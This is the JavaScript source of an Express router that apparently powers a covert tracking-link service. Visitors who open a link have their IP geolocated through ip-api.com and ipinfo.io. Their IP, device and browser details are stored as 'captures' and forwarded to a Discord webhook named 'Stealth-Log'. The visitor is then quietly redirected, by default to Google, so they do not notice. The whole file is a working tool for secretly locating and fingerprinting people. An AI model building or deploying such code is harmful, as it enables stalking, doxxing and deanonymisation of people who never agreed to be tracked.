const express = require('express');
const router = express.Router();
const db = require('../db');
const { toRow } = require('../services/capture');

function getIP(req) {
  let ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket?.remoteAddress || 'unknown';
  if (Array.isArray(ip)) ip = ip[0];
  if (ip && ip.includes(',')) ip = ip.split(',')[0].trim();
  if (typeof ip === 'string' && ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
  return ip;
}
function safe(str) { if (!str) return '??'; try { return decodeURIComponent(str); } catch (e) { return str; } }

async function getRedirectUrl() {
  try { const v = await db.getSetting('redirect_url'); if (v) return v; } catch (e) {}
  return process.env.REDIRECT_URL || 'https://www.google.com';
}

async function handlePost(req, res, slug) {
  const ip = getIP(req);
  const client = req.body || {};

  let link = null;
  if (slug) {
    link = await db.getLinkBySlug(slug);
    if (!link) return res.status(404).json({ error: 'Link not found' });
    if (db.linkExpired(link)) return res.status(410).json({ error: 'Link expired or inactive' });
    await db.incrementLinkVisits(link.id);
  }

  let geo = { status: 'fail' }, geo2 = {};
  try { const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`); geo = await r.json(); } catch (e) {}
  try { const r2 = await fetch(`https://ipinfo.io/${ip}/json`); geo2 = await r2.json(); } catch (e) {}
  const vh = {
    city: safe(req.headers['x-vercel-ip-city']),
    country: req.headers['x-vercel-ip-country'] || '??',
    region: req.headers['x-vercel-ip-country-region'] || '??',
    lat: req.headers['x-vercel-ip-latitude'] || null,
    lon: req.headers['x-vercel-ip-longitude'] || null,
    tz: req.headers['x-vercel-ip-timezone'] || '??',
  };

  try {
    const row = toRow(client, geo, geo2, vh, ip, link ? link.id : null);
    await db.insertCapture(row);
  } catch (e) { console.error('DB insert error:', e.message); }

  // forwarding
  const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
  if (WEBHOOK) {
    (async () => {
      try {
        const msg = {
          username: '🕵️ Stealth-Log',
          content: `**New capture** ${link ? `[${link.name || link.slug}]` : ''}\nIP: ${ip} (${geo.city || '??'}, ${geo.country || '??'})\n${client.parsedBrowser || '??'} / ${client.parsedOS || '??'} / ${client.deviceType || '??'}`,
        };
        const r = await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });
        if (!r.ok) console.error('Webhook failed:', r.status, await r.text());
      } catch (e) { console.error('Webhook error:', e.message); }
    })();
  }

  const redirect = link ? link.redirectUrl : await getRedirectUrl();
  res.json({ ok: true, redirect, expired: false });
}

router.post('/', (req, res) => handlePost(req, res, null));
router.post('/:slug', (req, res) => handlePost(req, res, req.params.slug));

router.get('/', async (req, res) => {
  const ip = getIP(req);
  let geo = { status: 'fail' };
  try { const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,lat,lon,isp,org,mobile,proxy,hosting,timezone,query`); geo = await r.json(); } catch (e) {}
  const ua = req.headers['user-agent'] || 'Unknown';
  try {
    const client = { userAgent: ua, parsedBrowser: 'Quick-GET', parsedOS: 'Quick-GET', deviceType: 'Unknown' };
    const vh = { city: null, country: req.headers['x-vercel-ip-country'] || null, region: null, lat: null, lon: null, tz: null };
    const row = toRow(client, geo, {}, vh, ip, null);
    await db.insertCapture(row);
  } catch (e) { console.error('DB insert error:', e.message); }
  res.redirect(302, await getRedirectUrl());
});

module.exports = router;
